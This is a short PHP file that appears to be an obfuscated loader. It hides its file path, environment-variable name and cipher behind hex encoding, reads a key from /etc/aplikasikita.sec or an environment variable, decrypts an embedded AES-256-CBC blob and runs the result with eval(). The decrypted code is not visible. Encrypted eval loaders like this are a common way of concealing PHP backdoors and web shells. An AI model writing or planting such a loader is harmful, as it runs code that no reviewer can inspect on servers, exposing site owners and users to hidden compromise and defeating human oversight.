<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FY20pnQ6qi3FST1ZgObVLg==');

$c=base64_decode(

'JxIBEBZ9H8JGX7McKtqm+ei9oM+dQvBCKZ2+TnCSnVeay4OVreS44gMHkMU37fhz3nYB7nyuM686' .
'xPCLpkWvJZuUl/24NEAL2zl5zhwsg/JT+5NesWbN8BbzIRVYggtRJE7hffiyPVKvunhwoOmqBrYj' .
'YjPLD/EVt4hkgn/ISfRXAohxOBxgwXlW3nQLUbrHuUfWp90H9K7taSA95lW9pwrkzG4WPD6qjT3N' .
'bHFvrCNPHWwQU75U5ZTIsO7gnJ3vX+V2dLHS0NbOTl+1ZcVadoimzAKo+7Lb2QBd0Fisu8Cw4thl' .
'K43pjtN8UzsbawESUcCdSrFXntDkGwI8AZhDmsKMxrTlRzl0rewekNwoIRwTiZo2+65PLruThA5q' .
'HIQW2UCkwXmWm2uPIILU17X9BfLlDkH8NAjV5+jb5vkR4RtSCZbcWm+MCDKCBUlBvyoODgCc0hxu' .
'nYcPP2NV4bSOeLWXF/stJtLGAy43Xb1X6FBY94GGvTcNRWyfHly79BPKW6cMEuh6icjkL2/Qvdrg' .
'NBKPWEPRDnSvYvJ3nqa/TWY='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

